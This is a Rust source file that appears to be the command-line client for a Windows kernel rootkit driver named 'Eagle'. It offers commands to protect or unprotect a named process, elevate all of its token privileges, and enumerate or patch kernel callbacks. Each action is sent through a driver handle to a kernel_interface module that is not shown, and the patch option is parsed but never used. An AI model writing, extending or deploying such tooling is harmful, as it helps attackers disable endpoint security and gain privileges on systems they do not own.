use sysinfo::{Pid, SystemExt, ProcessExt};
use winapi::um::{fileapi::{CreateFileA, OPEN_EXISTING}, winnt::{GENERIC_READ, GENERIC_WRITE, FILE_SHARE_READ, FILE_SHARE_WRITE}, handleapi::CloseHandle};
use std::{ffi::CString, ptr::null_mut};
mod kernel_interface;
use clap::{Args, Parser, Subcommand, ArgGroup};

#[derive(Parser)]
#[clap(author, version, about, long_about = None)]
struct Cli {
    #[clap(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
   Process(Process),
   Callbacks(Callbacks),
}

#[derive(Args)]
#[clap(group(
    ArgGroup::new("process")
        .required(true)
        .args(&["protect", "unprotect", "elevate"]),
))]
struct Process {
    /// Target process name
    #[clap(long, short, value_name = "PROCESS")]
    name: String,

    /// Protect a process
    #[clap(long, short)]
    protect: bool,

    /// Unprotect a process
    #[clap(long, short)]
    unprotect: bool,

    /// Elevate all token privileges
    #[clap(long, short)]
    elevate: bool,
}

#[derive(Args)]
#[clap(group(
    ArgGroup::new("callbacks")
        .required(true)
        .args(&["enumerate", "patch"]),
))]
struct Callbacks {
    /// Enumerate kernel callbacks
    #[clap(long, short)]
    enumerate: bool,

    /// Patch kernel callbacks
    #[clap(long, short)]
    patch: bool,
}

fn main() {

    let cli = Cli::parse();

    let file = CString::new("\\\\.\\Eagle").unwrap().into_raw() as *const i8;
    let driver_handle = unsafe { 
        CreateFileA(
        file,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        null_mut(),
        OPEN_EXISTING,
        0,
        null_mut())
    };

    if driver_handle.is_null() {
        panic!("[-] Failed to get a handle to the driver");
    }

    match &cli.command {
        Commands::Process(p) => {
            let process_id = get_process_id_by_name(p.name.as_str()) as u32;
            
            if p.protect {
                kernel_interface::protect_process(process_id, driver_handle);
            } else if p.unprotect {
                kernel_interface::unprotect_process(process_id, driver_handle);
            }

            if p.elevate {
                kernel_interface::enable_tokens(process_id, driver_handle);
            }
        }
        Commands::Callbacks(c) => {
            if c.enumerate {
                kernel_interface::enumerate_callbacks(driver_handle);
            }
        }
    }

    unsafe { CloseHandle(driver_handle) };
}

/// Get process ID by name
fn get_process_id_by_name(target_process: &str) -> Pid {
    let mut system = sysinfo::System::new();
    system.refresh_all();

    let mut process_id = 0;

    for process in system.process_by_name(target_process) {
        process_id = process.pid();
    }

    return process_id;
}